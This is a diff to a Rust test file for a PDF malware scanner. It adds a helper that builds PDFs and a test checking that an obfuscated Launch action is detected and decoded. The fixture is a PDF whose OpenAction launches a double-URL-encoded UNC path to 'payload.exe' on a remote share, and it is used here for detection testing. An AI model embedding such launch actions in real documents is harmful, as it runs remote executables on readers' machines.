@@ -1,6 +1,40 @@
 mod common;
 use common::default_scan_opts;
 
+fn build_pdf_with_objects(objects: &[&str]) -> Vec<u8> {
+    let mut pdf = Vec::new();
+    pdf.extend_from_slice(b"%PDF-1.4\n");
+    let mut offsets = vec![0usize; objects.len() + 1];
+    for object in objects {
+        let obj_num = object
+            .split_whitespace()
+            .next()
+            .and_then(|token| token.parse::<usize>().ok())
+            .expect("object number");
+        if obj_num < offsets.len() {
+            offsets[obj_num] = pdf.len();
+        }
+        pdf.extend_from_slice(object.as_bytes());
+    }
+    let start_xref = pdf.len();
+    let size = offsets.len();
+    pdf.extend_from_slice(format!("xref\n0 {}\n", size).as_bytes());
+    pdf.extend_from_slice(b"0000000000 65535 f \n");
+    for offset in offsets.iter().skip(1) {
+        if *offset == 0 {
+            pdf.extend_from_slice(b"0000000000 00000 f \n");
+        } else {
+            pdf.extend_from_slice(format!("{offset:010} 00000 n \n").as_bytes());
+        }
+    }
+    pdf.extend_from_slice(
+        format!("trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n", size).as_bytes(),
+    );
+    pdf.extend_from_slice(start_xref.to_string().as_bytes());
+    pdf.extend_from_slice(b"\n%%EOF\n");
+    pdf
+}
+
 #[test]
 fn detectors_flag_launch_external_program() {
     let bytes = include_bytes!("../../sis-pdf-core/tests/fixtures/launch_action.pdf");
@@ -23,4 +57,38 @@ fn detectors_flag_launch_external_program() {
         external.meta.get("launch.target_path").map(|v| v.contains("calc.exe")).unwrap_or(false),
         "expected launch target to include calc.exe"
     );
+}
+
+#[test]
+fn launch_action_records_normalised_obfuscated_target_metadata() {
+    let objects = vec![
+        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n",
+        "2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n",
+        "3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n",
+        "4 0 obj\n<< /S /Launch /F (%255c%255cserver%255cshare%255cpayload.exe) >>\nendobj\n",
+    ];
+    let bytes = build_pdf_with_objects(&objects);
+    let detectors = sis_pdf_detectors::default_detectors();
+    let report =
+        sis_pdf_core::runner::run_scan_with_detectors(&bytes, default_scan_opts(), &detectors)
+            .expect("scan");
+
+    let finding = report
+        .findings
+        .iter()
+        .find(|f| f.kind == "launch_action_present")
+        .expect("launch action finding");
+    assert_eq!(
+        finding
+            .meta
+            .get("injection.action_param_normalised")
+            .map(String::as_str),
+        Some("true")
+    );
+    let decode_layers = finding
+        .meta
+        .get("injection.decode_layers")
+        .and_then(|value| value.parse::<u8>().ok())
+        .unwrap_or(0);
+    assert!(decode_layers >= 2, "expected multi-layer normalisation");
 }
